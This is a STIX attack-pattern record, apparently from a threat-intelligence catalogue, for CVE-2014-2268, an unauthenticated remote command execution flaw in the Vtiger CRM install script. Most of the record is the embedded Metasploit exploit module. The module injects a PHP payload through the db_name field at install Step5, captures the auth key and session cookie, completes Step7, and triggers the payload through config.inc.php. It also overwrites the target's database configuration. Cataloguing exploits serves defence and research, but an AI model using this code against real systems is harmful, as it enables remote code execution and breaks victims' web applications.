{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--259fd85a-001b-40b2-ae52-8c7b57c54e51",
    "created": "2024-08-14T17:11:01.858033Z",
    "modified": "2024-08-14T17:11:01.858037Z",
    "name": "Vtiger Install Unauthenticated Remote Command Execution",
    "description": " This module exploits an arbitrary command execution vulnerability in the Vtiger install script. This module is set to ManualRanking due to this module overwriting the target database configuration, which may result in a broken web app, and you may not be able to get a session again. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/vtiger_install_rce.rb",
            "external_id": "vtiger_install_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-2268"
        },
        {
            "source_name": "reference",
            "url": "https://www.navixia.com/blog/entry/navixia-find-critical-vulnerabilities-in-vtiger-crm-cve-2014-2268-cve-2014-2269.html"
        },
        {
            "source_name": "reference",
            "url": "http://vtiger-crm.2324883.n4.nabble.com/Vtigercrm-developers-IMP-forgot-password-and-re-installation-security-fix-tt9786.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  # Application database configuration is overwritten\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Vtiger Install Unauthenticated Remote Command Execution',\n      'Description'    => %q{\n        This module exploits an arbitrary command execution vulnerability in the\n        Vtiger install script. This module is set to ManualRanking due to this\n        module overwriting the target database configuration, which may result in\n        a broken web app, and you may not be able to get a session again.\n      },\n      'Author'         =>\n        [\n          'Jonathan Borgeaud < research[at]navixia.com >' # Navixia Research Team\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2014-2268' ],\n          [ 'URL', 'https://www.navixia.com/blog/entry/navixia-find-critical-vulnerabilities-in-vtiger-crm-cve-2014-2268-cve-2014-2269.html'],\n          [ 'URL', 'http://vtiger-crm.2324883.n4.nabble.com/Vtigercrm-developers-IMP-forgot-password-and-re-installation-security-fix-tt9786.html'],\n\n        ],\n      'Privileged'     => false,\n      'Platform'       => ['php'],\n      'Payload'        =>\n        {\n          'Space'       => 4000,\n          'BadChars'    => \"#\",\n          'DisableNops' => true,\n          'Keys'        => ['php']\n        },\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [[ 'Vtiger 6.0.0 or older', { }]],\n      'DisclosureDate' => '2014-03-05',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The base path to Vtiger', '/'])\n        ])\n  end\n\n  def exploit\n    print_status(\"Injecting payload...\")\n    rand_arg = Rex::Text.rand_text_hex(10)\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.path, 'index.php'),\n      'headers'  => {'X-Requested-With' => rand_text_alpha(5)},\n      'vars_get' => {\n          'module'  => 'Install',\n          'view'    => 'Index',\n          'mode'    => 'Step5',\n          'db_name' => \"127.0.0.1'; if(isset($_GET['#{rand_arg}'])){ #{payload.encoded} } // \"\n      }})\n\n    # Check timeout\n    if not res\n      print_error(\"Request timed out, please try again\")\n      return\n    end\n\n    if res.body =~ /name=\"auth_key\"\\s+value=\".*?((?:[a-z0-9]*))\"/i\n      authkey   = $1\n      phpsessid = res.get_cookies\n\n      if authkey.blank?\n        print_error(\"No AuthKey found\")\n        return\n      elsif phpsessid.blank?\n        print_error(\"No PHP Session ID found\")\n        return\n      end\n\n      print_status(\"Retrieved Authkey : #{authkey}\")\n      print_status(\"Retrieved PHPSESSID : #{phpsessid}\")\n\n      send_request_cgi({\n        'method'     => 'GET',\n          'uri'      => normalize_uri(target_uri.path, 'index.php'),\n          'headers'  => {'X-Requested-With' => rand_text_alpha(5)},\n          'cookie'   => phpsessid,\n          'vars_get' =>\n            {\n              'module'   => 'Install',\n              'view'     => 'Index',\n              'mode'     => 'Step7',\n              'auth_key' => authkey\n            }\n        })\n\n        print_status(\"Executing payload...\")\n        send_request_cgi({\n          'method'    => 'GET',\n          'uri'       => normalize_uri(target_uri.path, 'config.inc.php'),\n          'vars_get'  => { rand_arg => '1' }\n        })\n    else\n      print_error(\"No auth_key pattern found\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-03-05",
    "x_mitre_platforms": [
        "['php']"
    ]
}